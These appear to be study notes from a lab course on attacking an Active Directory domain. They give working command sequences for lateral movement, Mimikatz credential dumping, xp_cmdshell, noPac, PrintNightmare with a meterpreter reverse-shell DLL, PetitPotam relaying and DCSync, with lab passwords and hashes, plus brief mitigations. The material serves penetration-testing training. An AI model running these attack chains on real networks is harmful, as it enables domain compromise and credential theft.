### Privileged Access

```
# There are several other ways we can move around a Windows domain:

- Remote Desktop Protocol (RDP) - is a remote access/management protocol that gives us GUI access to a target host

- PowerShell Remoting - also referred to as PSRemoting or Windows Remote Management (WinRM) access, 
  is a remote access protocol that allows us to run commands or enter an interactive command-line session 
  on a remote host using PowerShell

- MSSQL Server - an account with sysadmin privileges on an SQL Server instance can log into the instance 
  remotely and execute queries against the database. 
  This access can be used to run operating system commands in the context of the SQL Server service account through various methods.
```

```
We can enumerate this access in various ways. The easiest, once again, is via BloodHound, as the following edges exist to show us what types of remote access privileges a given user has:
```

[CanRDP](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canrdp)
[CanPSRemote](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#canpsremote)
[SQLAdmin](https://bloodhound.readthedocs.io/en/latest/data-analysis/edges.html#sqladmin)

### Remote Desktop

```
# Using PowerView, we could use the Get-NetLocalGroupMember function to begin enumerating members 
# of the Remote Desktop Users group on a given host. 
# Let's check out the Remote Desktop Users group on the MS01 host in our target domain.

PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Desktop Users"
```

### WinRM

```
# Enumerating the Remote Management Users Group

PS C:\htb> Get-NetLocalGroupMember -ComputerName ACADEMY-EA-MS01 -GroupName "Remote Management Users"

# We can also utilize this custom Cypher query in BloodHound to hunt for users with this type of access. 
# This can be done by pasting the query into the Raw Query box at the bottom of the screen and hitting enter.

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:CanPSRemote*1..]->(c:Computer) RETURN p2

# Next, We can use the Enter-PSSession cmdlet using PowerShell from a Windows host.

# Establishing WinRM Session from Windows

PS C:\htb> $password = ConvertTo-SecureString "Klmcargo2" -AsPlainText -Force
PS C:\htb> $cred = new-object System.Management.Automation.PSCredential ("INLANEFREIGHT\forend", $password)
PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-MS01 -Credential $cred

# From our Linux attack host, we can use the tool evil-winrm to connect.
# To use evil-winrm we can install it using the following command:

gem install evil-winrm                          # Installing Evil-WinRM
evil-winrm                                      # Viewing Evil-WinRM's Help Menu
evil-winrm -i 10.129.201.234 -u forend          # Connecting to a Target with Evil-WinRM and Valid Credentials
```

### SQL Server Admin

```
# BloodHound, once again, is a great bet for finding this type of access via the SQLAdmin edge. 
# We can check for SQL Admin Rights in the Node Info tab for a given user or use this custom Cypher query to search: 

MATCH p1=shortestPath((u1:User)-[r1:MemberOf*1..]->(g1:Group)) MATCH p2=(u1)-[:SQLAdmin*1..]->(c:Computer) RETURN p2

# Here we see one user, damundsen has SQLAdmin rights over the host ACADEMY-EA-DB01.
```

[PowerUpSQL](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)

```
# We can use our ACL rights to authenticate with the wley user, 
# change the password for the damundsen user and then authenticate with the target using a tool such as PowerUpSQL
# Let's assume we changed the account password to SQL1234! using our ACL rights. 
# We can now authenticate and run operating system commands.

PS C:\htb> cd .\PowerUpSQL\
PS C:\htb>  Import-Module .\PowerUpSQL.ps1
PS C:\htb>  Get-SQLInstanceDomain

# We could then authenticate against the remote SQL server host 
# and run custom queries or operating system commands. 

PS C:\htb>  Get-SQLQuery -Verbose -Instance "172.16.5.150,1433" -username "inlanefreight\damundsen" -password "SQL1234!" -query 'Select @@version'

# We can also authenticate from our Linux attack host using mssqlclient.py from the Impacket toolkit.

mssqlclient.py                                                         # check tool
mssqlclient.py INLANEFREIGHT/DAMUNDSEN@172.16.5.150 -windows-auth      # connect

# Once connected, we could type help to see what commands are available to us.

SQL> help

# We could then choose enable_xp_cmdshell to enable the xp_cmdshell stored procedure 
# which allows for one to execute operating system commands via the database 
# if the account in question has the proper access rights.

SQL> enable_xp_cmdshell

# Finally, we can run commands in the format xp_cmdshell <command>. 
# Here we can enumerate the rights that our user has on the system and see that we have SeImpersonatePrivilege, 
# which can be leveraged in combination with a tool such as JuicyPotato, PrintSpoofer, or RoguePotato 
# to escalate to SYSTEM level privileges, depending on the target host, and use this access to continue toward our goal.

xp_cmdshell whoami /priv

### Kerberos "Double Hop" Problem

```
# There's an issue known as the "Double Hop" problem that arises when an attacker attempts 
# to use Kerberos authentication across two (or more) hops. 
# The issue concerns how Kerberos tickets are granted for specific resources. 
# Kerberos tickets should not be viewed as passwords. 
# They are signed pieces of data from the KDC that state what resources an account can access.

# The "Double Hop" problem often occurs when using WinRM/Powershell since the default authentication mechanism only provides 
# a ticket to access a specific resource. 
# This will likely cause issues when trying to perform lateral movement or even access file shares from the remote shell. 

# If we authenticate to the remote host via WinRM and then run Mimikatz, we don't see credentials for the backupadm user in memory.:

PS C:\htb> PS C:\Users\ben.INLANEFREIGHT> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm
[DEV01]: PS C:\Users\backupadm\Documents> cd 'C:\Users\Public\'
[DEV01]: PS C:\Users\Public> .\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit

mimikatz(commandline) # privilege::debug
mimikatz(commandline) # sekurlsa::logonpasswords


# There are indeed processes running in the context of the backupadm user, such as wsmprovhost.exe, 
# which is the process that spawns when a Windows Remote PowerShell session is spawned.

PS C:\Users\Public> tasklist /V |findstr backupadm
```

### Workarounds

[PS C:\Users\Public> tasklist /V |findstr backupadm](https://posts.slayerlabs.com/double-hop/)

```
# A few workarounds for the double-hop issue are covered in the post above.

# Workaround #1: PSCredential Object

# After connecting to a remote host with domain credentials, we import PowerView and then try to run a command. 
# As seen below, we get an error because we cannot pass our authentication on to the Domain Controller to query for the SPN accounts.

*Evil-WinRM* PS C:\Users\backupadm\Documents> import-module .\PowerView.ps1

|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
|S-chain|-<>-127.0.0.1:9051-<><>-172.16.8.50:5985-<><>-OK
*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn
Exception calling "FindAll" with "0" argument(s): "An operations error occurred.

# If we check with klist, we see that we only have a cached Kerberos ticket for our current server.

*Evil-WinRM* PS C:\Users\backupadm\Documents> klist

# So now, let's set up a PSCredential object and try again. First, we set up our authentication.

*Evil-WinRM* PS C:\Users\backupadm\Documents> $SecPassword = ConvertTo-SecureString '!qazXSW@' -AsPlainText -Force

# Now we can try to query the SPN accounts using PowerView and are successful because we passed our credentials along with the command.

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn -credential $Cred | select samaccountname

# If we try again without specifying the -credential flag, we once again get an error message.

get-domainuser -spn | select 

*Evil-WinRM* PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname 

# If we RDP to the same host, open a CMD prompt, and type klist, we'll see that we have the necessary tickets cached 
# to interact directly with the Domain Controller, and we don't need to worry about the double hop problem. 
# This is because our password is stored in memory, so it can be sent along with every request we make.

C:\htb> klist
```

```
# Workaround #2: Register PSSession Configuration

# Let's start by first establishing a WinRM session on the remote host.

PS C:\htb> Enter-PSSession -ComputerName ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL -Credential inlanefreight\backupadm

# If we check for cached tickets using klist, we'll see that the same problem exists. 
# Due to the double hop problem, we can only interact with resources in our current session 
# but cannot access the DC directly using PowerView. 
# We can see that our current TGS is good for accessing the HTTP service on the target since we connected over WinRM, 
# which uses SOAP (Simple Object Access Protocol) requests in XML format to communicate over HTTP, so it makes sense.

[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> klist

# We also cannot interact directly with the DC using PowerView:

[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> Import-Module .\PowerView.ps1
[ACADEMY-AEN-DEV01.INLANEFREIGHT.LOCAL]: PS C:\Users\backupadm\Documents> get-domainuser -spn | select samaccountname

Exception calling "FindAll" with "0" argument(s): "An operations error occurred.
"

# One trick we can use here is registering a new session configuration using the Register-PSSessionConfiguration cmdlet.

PS C:\htb> Register-PSSessionConfiguration -Name backupadmsess -RunAsCredential inlanefreight\backupadm

# Once this is done, we need to restart the WinRM service by typing Restart-Service WinRM in our current PSSession.

Restart-Service WinRM 

# This will kick us out, so we'll start a new PSSession using the named registered session we set up previously.
# After we start the session, we can see that the double hop problem has been eliminated, and if we type klist, 
# we'll have the cached tickets necessary to reach the Domain Controller. 
# This works because our local machine will now impersonate the remote machine in the context of the backupadm user 
# and all requests from our local machine will be sent directly to the Domain Controller.

PS C:\htb> Enter-PSSession -ComputerName DEV01 -Credential INLANEFREIGHT\backupadm -ConfigurationName  backupadmsess
[DEV01]: PS C:\Users\backupadm\Documents> klist

# We can now run tools such as PowerView without having to create a new PSCredential object.

[DEV01]: PS C:\Users\Public> get-domainuser -spn | select samaccountname

# Note: We cannot use Register-PSSessionConfiguration from an evil-winrm shell because we won't be able to get the credentials popup. 
# Furthermore, if we try to run this by first setting up a PSCredential object 
# and then attempting to run the command by passing credentials like -RunAsCredential $Cred, 
# we will get an error because we can only use RunAs from an elevated PowerShell terminal. 

# We can also use other methods such as CredSSP, port forwarding, or injecting into a process running 
# in the context of a target user (sacrificial process) that we won't cover here.
```

### Bleeding Edge Vulnerabilities

```
# NoPac (SamAccountName Spoofing)

# A great example of an emerging threat is the Sam_The_Admin vulnerability, also called noPac or referred 
# to as SamAccountName Spoofing released at the end of 2021. 
# This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, 
# allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. 
# Here is a quick breakdown of what each CVE provides regarding this vulnerability.

git clone https://github.com/SecureAuthCorp/impacket.git             # Ensuring Impacket is Installed
python setup.py install
git clone https://github.com/Ridter/noPac.git                        # Cloning the NoPac Exploit Repo

sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap          # Scanning for NoPac, shell
sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap

# We will notice that a semi-interactive shell session is established with the target using smbexec.py. 
# Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using cd.
# It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. 
# We can use ls to confirm.

ls                                              # Confirming the Location of Saved Tickets
output:
administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils
README.md  scanner.py

# We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. 
# We can also use the tool with the -dump flag to perform a DCSync using secretsdump.py. 
# This method would still create a ccache file on disk, which we would want to be aware of and clean up.

# Using noPac to DCSync the Built-in Administrator Account

sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator
```

### PrintNightmare

```
git clone https://github.com/cube0x0/CVE-2021-1675.git   # Cloning the Exploit

# For this exploit to work successfully, we will need to use cube0x0's version of Impacket. 
# We may need to uninstall the version of Impacket on our attack host and install cube0x0's

pip3 uninstall impacket                                  # Install cube0x0's Version of Impacket
git clone https://github.com/cube0x0/impacket
cd impacket
python3 ./setup.py install

# We can use rpcdump.py to see if Print System Asynchronous Protocol 
# and Print System Remote Protocol are exposed on the target.

rpcdump.py @172.16.5.5 | egrep 'MS-RPRN|MS-PAR'          # Enumerating for MS-RPRN

# After confirming this, we can proceed with attempting to use the exploit. 
# We can begin by crafting a DLL payload using msfvenom.:

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.225 LPORT=8080 -f dll > backupscript.dll

# We will then host this payload in an SMB share we create on our attack host using smbserver.py.:

sudo smbserver.py -smb2support CompData /path/to/backupscript.dll

# Once the share is created and hosting our payload, 
# we can use MSF to configure & start a multi handler responsible 
# for catching the reverse shell that gets executed on the target.:

[msf](Jobs:0 Agents:0) >> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LHOST 172.16.5.225
LHOST => 10.3.88.114
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> set LPORT 8080
LPORT => 8080
[msf](Jobs:0 Agents:0) exploit(multi/handler) >> run

[*] Started reverse TCP handler on 172.16.5.225:8080
```

```
# With the share hosting our payload and our multi handler listening for a connection, 
# we can attempt to run the exploit against the target. 
# The command below is how we use the exploit:

sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\172.16.5.225\CompData\backupscript.dll'

# Notice how at the end of the command, we include the path to the share hosting our payload 
# (\\<ip address of attack host>\ShareName\nameofpayload.dll). 
# If all goes well after running the exploit, the target will access the share and execute the payload. 
# The payload will then call back to our multi handler giving us an elevated SYSTEM shell.

[*] Sending stage (200262 bytes) to 172.16.5.5

### PetitPotam (MS-EFSRPC)

[Blog](https://dirkjanm.io/ntlm-relaying-to-ad-certificate-services/)

[PetitPotam.py](https://github.com/topotam/PetitPotam)

[Invoke-PetitPotam.ps1](https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1)

[EfsRpcOpenFileRaw](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/ccc4fb75-1c86-41d7-bbc4-b278ec13bfb8)

```
# This blog post goes into more detail on NTLM relaying to AD CS and the PetitPotam attack.

# Let's walk through the attack. First off, we need to start ntlmrelayx.py in one window on our attack host, 
# specifying the Web Enrollment URL for the CA host and using either the KerberosAuthentication or DomainController AD CS template. 
# If we didn't know the location of the CA, we could use a tool such as certi to attempt to locate :

sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# In another window, we can run the tool PetitPotam.py. 
# We run this tool with the command python3 PetitPotam.py <attack host IP> <Domain Controller IP> 
# to attempt to coerce the Domain Controller to authenticate to our host where ntlmrelayx.py is running.

# There is an executable version of this tool that can be run from a Windows host. 
# The authentication trigger has also been added to Mimikatz and can be run as follows 
# using the encrypting file system (EFS) module: misc::efs /server:<Domain Controller> /connect:<ATTACK HOST>. 
# There is also a PowerShell implementation of the tool Invoke-PetitPotam.ps1.

# Here we run the tool and attempt to coerce authentication via the EfsRpcOpenFileRaw method.:

python3 PetitPotam.py 172.16.5.225 172.16.5.5
```

```
# Catching Base64 Encoded Certificate for DC01

# Back in our other window, we will see a successful login request and obtain the base64 encoded certificate 
# for the Domain Controller if the attack is successful.

sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController

# Requesting a TGT Using gettgtpkinit.py
# Next, we can take this base64 certificate and use gettgtpkinit.py to request a Ticket-Granting-Ticket (TGT) for the domain controller.

python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache

# Setting the KRB5CCNAME Environment Variable
# The TGT requested above was saved down to the dc01.ccache file, which we use to set the KRB5CCNAME environment variable, 
# so our attack host uses this file for Kerberos authentication attempts.:

export KRB5CCNAME=dc01.ccache

# Using Domain Controller TGT to DCSync
# We can then use this TGT with secretsdump.py to perform a DCSYnc and retrieve one or all of the NTLM password hashes for the domain.:

secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass "ACADEMY-EA-DC01$"@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

# We could also use a more straightforward command: 

secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL 

# because the tool will retrieve the username from the ccache file. 
# We can see this using the klist command (requires installation of the krb5-user package).
```

```
# Confirming Admin Access to the Domain Controller
# Finally, we could use the NT hash for the built-in Administrator account to authenticate to the Domain Controller.:

crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf
```

```
# Submitting a TGS Request for Ourselves Using getnthash.py

# We can also take an alternate route once we have the TGT for our target. 
# Using the tool getnthash.py from PKINITtools we could request the NT hash for our target host/user 
# by using Kerberos U2U to submit a TGS request with the Privileged Attribute Certificate (PAC) which contains the NT hash for the target.
# This can be decrypted with the AS-REP encryption key we obtained when requesting the TGT earlier.

python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01$

# We can then use this hash to perform a DCSync with secretsdump.py using the -hashes flag.
```

```
# Using Domain Controller NTLM Hash to DCSync

secretsdump.py -just-dc-user INLANEFREIGHT/administrator "ACADEMY-EA-DC01$"@172.16.5.5 -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba

# Alternatively, once we obtain the base64 certificate via ntlmrelayx.py, we could use the certificate with the Rubeus tool on a Windows attack host 
# to request a TGT ticket and perform a pass-the-ticket (PTT) attack all at once.
```

```
# Requesting TGT and Performing PTT with DC01$ Machine Account

PS C:\Tools> .\Rubeus.exe asktgt /user:ACADEMY-EA-DC01$ /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt

# We can then type klist to confirm that the ticket is in memory.

# Again, since Domain Controllers have replication privileges in the domain, 
# we can use the pass-the-ticket to perform a DCSync attack using Mimikatz from our Windows attack host. 
# Here, we grab the NT hash for the KRBTGT account, which could be used to create a Golden Ticket and establish persistence. 
# We could obtain the NT hash for any privileged user using DCSync and move forward to the next phase of our assessment.
```

```
# Performing DCSync with Mimikatz

PS C:\Tools> cd .\mimikatz\x64\
PS C:\Tools\mimikatz\x64> .\mimikatz.exe

mimikatz # lsadump::dcsync /user:inlanefreight\krbtgt
```

### PetitPotam Mitigations

```
# First off, the patch for CVE-2021-36942 should be applied to any affected hosts. 
# Below are some further hardening steps that can be taken:

- To prevent NTLM relay attacks, use Extended Protection for Authentication along with enabling 
  Require SSL to only allow HTTPS connections for the Certificate Authority Web Enrollment and Certificate Enrollment Web Service services
- Disabling NTLM authentication for Domain Controllers
- Disabling NTLM on AD CS servers using Group Policy
- Disabling NTLM for IIS on AD CS servers where the Certificate Authority Web Enrollment and 
  Certificate Enrollment Web Service services are in use
```
